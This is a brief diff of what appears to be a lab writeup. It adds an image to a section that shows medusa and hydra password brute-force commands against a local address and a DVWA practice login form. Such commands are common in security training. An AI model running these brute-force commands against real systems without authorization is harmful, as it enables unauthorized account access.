@@ -42,5 +42,9 @@ medusa -h 192.168.1.16 -U wordlists/simples_usernames.txt -P wordlists/simples_p
 
 hydra -l admin -P wordlists/simples_passwords.txt 192.168.1.16 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:F=incorrect"
 
+![Texto alternativo](images/imagem1.png)
+
+
+
 
 
